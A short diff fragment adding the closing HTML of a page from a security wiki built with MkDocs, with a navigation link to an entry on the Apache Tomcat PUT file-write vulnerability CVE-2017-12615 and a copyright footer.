+        Previous</a><a href="../Apache%20Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/" class="btn btn-xs btn-link">
+        Apache Tomcat PUT方法任意写文件漏洞 CVE-2017-12615
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
